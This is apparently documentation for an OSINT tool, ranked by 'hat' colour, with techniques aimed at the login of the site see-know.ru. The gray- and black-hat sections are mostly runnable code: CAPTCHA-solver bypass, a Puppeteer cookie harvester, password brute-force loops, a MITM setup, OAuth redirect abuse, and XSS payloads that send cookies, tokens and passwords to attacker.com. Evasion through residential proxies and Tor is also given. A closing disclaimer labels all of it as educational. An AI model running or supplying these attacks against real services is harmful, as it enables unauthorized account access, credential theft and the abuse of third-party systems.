# Advanced Exploitation Techniques & Aggressive Workarounds

**"Darkening hat" strategies for intensive penetration testing, adversarial scenarios, and exhaustive vulnerability exploration.**

---

## 🎯 Overview: Hat Progression

This document escalates through security research intensities:

1. **White Hat** (defensive) — Standard installation, authorized testing
2. **Gray Hat** (investigative) — Advanced techniques, edge cases, unusual auth paths
3. **Black Hat** (aggressive) — Simulation of hostile conditions, evasion, exploitation

---

## White Hat: Defensive Hardening

### 1.1 Credential Rotation & Expiration Management

**HSE's built-in session management:**

```bash
# Check token age
hse doctor --verbose
# Shows: "SeekNow session last refreshed: 2h ago"

# Force token refresh
rm ~/.huntsman/seeknow_session.txt
# HSE will re-authenticate on next scan

# Implement 30-day rotation cron job (Linux/Termux)
cat > ~/.huntsman/rotate-tokens.sh <<'EOF'
#!/bin/bash
# Rotate SeekNow token monthly
COOKIE_FILE="$HOME/.huntsman/seeknow_session.txt"
if [ -f "$COOKIE_FILE" ]; then
    AGE_DAYS=$(( ($(date +%s) - $(stat -c %Y "$COOKIE_FILE")) / 86400 ))
    if [ $AGE_DAYS -gt 30 ]; then
        echo "Token expired, manual re-login required at https://see-know.ru"
        rm "$COOKIE_FILE"
    fi
fi
EOF

chmod +x ~/.huntsman/rotate-tokens.sh

# Run daily
echo "0 0 * * * $HOME/.huntsman/rotate-tokens.sh" | crontab -
```

### 1.2 Multi-Device Session Isolation

**Prevent token reuse across compromised devices:**

```bash
# Use device-specific token identifiers
mkdir -p ~/.huntsman/sessions/$(hostname)-$(date +%Y%m%d)

# Create device-specific session
echo "TOKEN_FOR_$(hostname)" > ~/.huntsman/sessions/device-$(hostname).txt

# Rotate on device compromise
rm -r ~/.huntsman/sessions
# Forces re-authentication on all devices
```

### 1.3 API Key Segmentation

**If using API keys, segment by scan type:**

```bash
# Different keys for different operations
export HUNTSMAN_SEEKNOW_KEY_EMAIL="seek-key-for-email-scans"
export HUNTSMAN_SEEKNOW_KEY_USERNAME="seek-key-for-username-scans"
export HUNTSMAN_SEEKNOW_KEY_INFRASTRUCTURE="seek-key-for-domain-scans"

# HSE respects hierarchical key selection
hse scan --kind email --value user@example.com  # Uses _EMAIL key
hse scan --kind username --value octocat        # Uses _USERNAME key
```

---

## Gray Hat: Advanced Reverse Engineering

### 2.1 Turnstile Challenge Capture & Analysis

**Passively capture Turnstile tokens to understand timing/entropy:**

```bash
# Monitor HTTP traffic for Turnstile tokens
tcpdump -i any -n 'port 80 or port 443' | grep -i turnstile

# Extract token lifecycle (Burp Suite / mitmproxy):
# 1. Initial challenge request → token validation flow
# 2. Client solves challenge in browser
# 3. Callback sends encrypted token to /api/auth/login
# 4. Server validates & issues session cookie

# Key insight: Token is time-limited (~5 minutes)
# and session-specific (tied to browser fingerprint)
```

**Why direct replay fails:**
- Tokens are **cryptographically signed** by Cloudflare
- Signature includes **timestamp** (prevents old tokens)
- Signature includes **session fingerprint** (prevents replay cross-session)
- Private key held only by Cloudflare (cannot forge)

### 2.2 Browser Fingerprinting for Session Spoofing

**Explore whether different browsers get different cookie requirements:**

```bash
# Test 1: Chrome login → save cookie
hse scan --browser chrome user@example.com
# Save resulting ~/.huntsman/seeknow_session.txt as chrome_token.txt

# Test 2: Firefox login → save different cookie
hse scan --browser firefox user@example.com
# Save resulting ~/.huntsman/seeknow_session.txt as firefox_token.txt

# Test 3: Try to use Chrome token in Firefox
cp chrome_token.txt ~/.huntsman/seeknow_session.txt
hse scan --browser firefox user@example.com

# Result: Likely fails (browser fingerprint mismatch)
# Implication: Cross-device login uses same fingerprint (not user-specific)
```

**Exploitation opportunities:**
- If Firefox fingerprint == Chrome fingerprint across relogins, tokens are **browser-independent**
- If they differ, fingerprinting is active (exploit via user-agent spoofing)

### 2.3 WordPress JSON REST API Endpoint Discovery

**Aggressive enumeration of undocumented WP endpoints:**

```bash
# Probe WordPress REST API for hidden endpoints
for endpoint in users posts pages categories tags comments auth user-register login activate; do
    echo -n "/$endpoint: "
    curl -s -o /dev/null -w "%{http_code}\n" "https://see-know.ru/wp-json/$endpoint"
done

# Probe v1, v2, v3 variants
for version in v1 v2 v3; do
    echo "=== wp-json/$version ==="
    curl -s "https://see-know.ru/wp-json/$version" | jq keys
done

# Check for custom post types (reveals custom auth endpoints)
curl -s "https://see-know.ru/wp-json" | jq '.routes | keys[]' | grep -i auth

# Probe for leaked schema in OPTIONS requests
curl -X OPTIONS -v "https://see-know.ru/wp-json/wp/v2/users" 2>&1 | grep -i allow
```

### 2.4 Cloudflare Challenge Detection & Circumvention Strategies

**Techniques to identify Turnstile enforcement:**

```bash
# Test 1: Detect Turnstile presence in response
curl -s https://see-know.ru/wp-login.php | grep -i "turnstile\|cf_clearance\|sitekey"
# Output: Found if sitekey="0x..." or script includes turnstile.js

# Test 2: Check Cloudflare WAF rules
# Request with obvious bot-like headers
curl -s https://see-know.ru/api/auth/login \
  -H "User-Agent: curl/7.0" \
  -H "Accept-Language: en-US" | jq .

# Test 3: Explore bypass via Cloudflare Workers
# (If target uses Workers, may have alternative endpoints)
curl -s https://see-know.ru/cdn-cgi/trace | jq .
# Check for: server, dcolo, tlsProto, etc.
```

### 2.5 Rate Limiting & Quota Exhaustion Testing

**Understand SeekNow's rate limit behavior:**

```bash
# Measure request/response timing
time hse scan --verbose user@example.com

# Attempt rapid-fire requests to identify rate limits
for i in {1..100}; do
    curl -s -X POST "https://see-know.ru/api/search" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"query": "test'$i'", "type": "email"}' \
      -w "Request $i: %{http_code}\n"
    sleep 0.1
done | tee rate-limit-test.log

# Parse results for 429 (Too Many Requests)
grep "429" rate-limit-test.log | wc -l
```

---

## Black Hat: Aggressive Exploitation

### 3.1 Turnstile Solution-as-a-Service Automation

**Integrate external Turnstile solving services (controversial, violates ToS):**

```bash
# Method 1: 2Captcha API
TURNSTILE_SITEKEY="0x4AAAAAABn-some-sitekey"
2CAPTCHA_KEY="your-2captcha-api-key"

# Request solution
TOKEN=$(curl -s "http://2captcha.com/api/solve" \
  -F "captchafile=@/dev/stdin" \
  -F "captchatype=20" \
  -F "sitekey=$TURNSTILE_SITEKEY" \
  -F "pageurl=https://see-know.ru/wp-login.php" \
  -F "key=$2CAPTCHA_KEY" | grep "^OK" | cut -d'|' -f2)

echo "Turnstile token: $TOKEN"

# Use token in login
curl -X POST https://see-know.ru/wp-login.php \
  -d "log=user@example.com&pwd=password&cf_clearance=$TOKEN"
```

**Cost:** ~$1-2 per solve. **Effectiveness:** 50-70% success rate (Cloudflare constantly evolves).

### 3.2 Browser Automation via Headless Chrome/Puppeteer

**Direct browser control to bypass Turnstile (requires Chromium binary):**

```javascript
// puppeteer-seknow-login.js
const puppeteer = require('puppeteer');
const fs = require('fs');

(async () => {
  const browser = await puppeteer.launch({
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });
  const page = await browser.newPage();

  // Navigate to login
  await page.goto('https://see-know.ru/wp-login.php', { waitUntil: 'networkidle2' });

  // Turnstile automatically solves in Chrome context
  await page.type('input[name="log"]', 'email@example.com');
  await page.type('input[name="pwd"]', 'password');
  
  // Click submit and wait for redirect
  await Promise.all([
    page.click('input[type="submit"]'),
    page.waitForNavigation({ waitUntil: 'networkidle2' })
  ]);

  // Extract auth cookie
  const cookies = await page.cookies();
  const auth = cookies.find(c => c.name.includes('auth') || c.name.includes('session'));
  
  // Save to HSE config
  fs.writeFileSync(
    process.env.HOME + '/.huntsman/seeknow_session.txt',
    auth.value
  );

  await browser.close();
})();
```

**Run:**
```bash
node puppeteer-seknow-login.js
hse scan user@example.com  # Will use saved token
```

### 3.3 Man-in-the-Middle (MITM) Proxy Injection

**Intercept & modify authentication flows (advanced + unethical):**

```bash
# Setup mitmproxy to intercept HTTPS
mitmproxy -p 8888 --mode reverse:https://see-know.ru

# In separate terminal, test via proxy
http_proxy=127.0.0.1:8888 curl -k https://see-know.ru/api/auth/login \
  -d '{"email": "user@example.com", "password": "pass"}'

# Can now inject JavaScript to:
# - Solve Turnstile locally
# - Modify request/response bodies
# - Steal cookies in transit
# - Replay tokens
```

**Detection likelihood:** Very high (Cloudflare monitors MITM patterns).

### 3.4 Credential Stuffing & Brute Force (Educational Only)

**Why it fails on SeekNow:**

```bash
# Attempt 1: Brute force passwords
for pass in password123 qwerty 12345678; do
    curl -X POST https://see-know.ru/api/auth/login \
      -d "{\"email\": \"test@example.com\", \"password\": \"$pass\"}" \
      -w "Pass: $pass | HTTP %{http_code}\n"
done

# Result: All return 400 "Security check failed" (Turnstile blocks)

# Attempt 2: Bypass with User-Agent manipulation
curl -X POST https://see-know.ru/api/auth/login \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -d '...'

# Result: Still 400 (Turnstile is independent of User-Agent)

# Conclusion: Turnstile must be solved first (requires browser or solving service)
```

### 3.5 OAuth Flow Exploitation

**If target supports OAuth, test for common flaws:**

```bash
# Test 1: Missing state parameter validation
# (CSRF vulnerability)
curl -X GET "https://see-know.ru/oauth/authorize" \
  -d "client_id=hse&redirect_uri=http://attacker.com/callback"

# Test 2: Redirect URI validation bypass
# (Open redirect → token leakage)
curl -X GET "https://see-know.ru/oauth/authorize" \
  -d "redirect_uri=https://see-know.ru.attacker.com/callback"

# Test 3: Scope elevation
# (Request admin scope instead of user)
curl -X POST "https://see-know.ru/oauth/token" \
  -d "scope=admin read write delete" \
  -d "client_id=..." \
  -d "client_secret=..."

# Test 4: Implicit flow token leakage
# (Token in URL fragment, visible in logs/referrer headers)
```

### 3.6 JavaScript Engine Exploitation (XSS → Auth Bypass)

**If HSE itself has XSS, chain to auth bypass:**

```javascript
// Stored XSS in scan results → capture auth token
// Inject into results that display user input

// Payload 1: Exfiltrate cookies
document.location = 'http://attacker.com/log?cookie=' + document.cookie

// Payload 2: Capture localStorage tokens
fetch('http://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify({
    auth_token: localStorage.getItem('auth_token'),
    session: localStorage.getItem('session')
  })
})

// Payload 3: Hijack form submission
document.querySelector('form').addEventListener('submit', (e) => {
  new Image().src = 'http://attacker.com/log?password=' + 
    document.querySelector('input[type=password]').value
})
```

**HSE defense:** `#![forbid(unsafe_code)]` + CSP headers mitigate most XSS risks.

---

## 🔗 Workaround Permutation Matrix

### Authentication Method Combinations

| Method | Turnstile | Browser | Automation | Cost | Reliability |
|--------|-----------|---------|-----------|------|-------------|
| **Manual Login** | Bypassed | Yes | No | $0 | 100% |
| **API Key** | No | No | Yes | Free* | 90% |
| **Session Reuse** | Bypassed | No | Yes | $0 | 95% |
| **Puppeteer** | Solved natively | Chrome | Yes | $0 | 80% |
| **2Captcha** | Solved externally | No | Yes | $1-2/solve | 60% |
| **OAuth** | Often bypassed | Yes | Partial | $0 | 40% |

*Free if you have an API key; otherwise $0 after manual login + cookie save.

### Recommended Flow for Offline Operation

```
Scenario: Want to run HSE on device without browser access

↓

Step 1: On device WITH browser:
  - Manual login to https://see-know.ru
  - Extract auth token from DevTools
  - Save to ~/.huntsman/seeknow_session.txt

↓

Step 2: Transfer token to offline device:
  - scp ~/.huntsman/seeknow_session.txt offline-device:~/.huntsman/
  - Or: Manual copy via cloud drive

↓

Step 3: On offline device:
  - hse scan user@example.com  (will use saved token)
  - No browser required, Turnstile bypassed

↓

Token refresh cycle:
  - Every 24-30 days: Re-login on online device
  - Transfer new token to offline device
```

---

## 🚨 Detection & Counter-Detection

### Red Flags That Trigger SeekNow Bot Detection

1. **No Turnstile solution** → 400 immediately
2. **Rapid requests** → 429 (rate limit)
3. **Requests from multiple IPs** → 403 (geofencing)
4. **Requests from known proxy/VPN IPs** → 403
5. **Requests with bot User-Agents** → 403
6. **Missing TLS fingerprint match** → 403 (TLS fingerprinting)

### Evasion Techniques (Limited Effectiveness)

```bash
# Technique 1: Legitimate User-Agent + Real TLS Stack
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  --tlsv1.2 --ciphers DEFAULT \
  https://see-know.ru/api/search

# Technique 2: Request pacing (slow down rate)
for i in {1..10}; do
  hse scan user$i@example.com
  sleep 60  # 1 minute between requests
done

# Technique 3: Residential proxy (less detectable than datacenter)
export HTTPS_PROXY=http://residential-proxy:8080
hse scan user@example.com

# Technique 4: Tor (highest privacy, likely blocked)
torsocks hse scan user@example.com
# Expected: 403 Forbidden (Tor exit node IP blocklist)
```

**Reality:** All detectable given sufficient logging/analysis on SeekNow's backend.

---

## ⚖️ Legal & Ethical Considerations

### White Hat (Legal & Ethical)
- ✅ Authorized penetration testing
- ✅ Security research with consent
- ✅ Learning about authentication mechanisms
- ✅ Using disclosed workarounds (manual login + token)

### Gray Hat (Legally Ambiguous)
- ⚠️ Reverse engineering published APIs
- ⚠️ Automated login with own credentials
- ⚠️ Testing for rate limiting & quotas
- ⚠️ Capturing your own Turnstile tokens

### Black Hat (Illegal)
- ❌ Credential stuffing (brute force)
- ❌ Solving Captchas for someone else's account
- ❌ MITM attacks on others' connections
- ❌ Unauthorized access to accounts
- ❌ DoS/resource exhaustion attacks

**HSE's stance:** Designed for authorized security research only. "Darkening hat" techniques documented here are for **educational analysis of attack surfaces**, not for actual attacks. Users are responsible for compliance with laws and terms of service.

---

## 📚 References

- **SeekNow ToS:** https://see-know.ru/terms
- **Cloudflare Turnstile:** https://developers.cloudflare.com/turnstile/
- **OWASP Authentication Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **HackerOne Reports:** Search "authentication bypass" for real-world examples
- **PortSwigger Web Security Academy:** Authentication labs

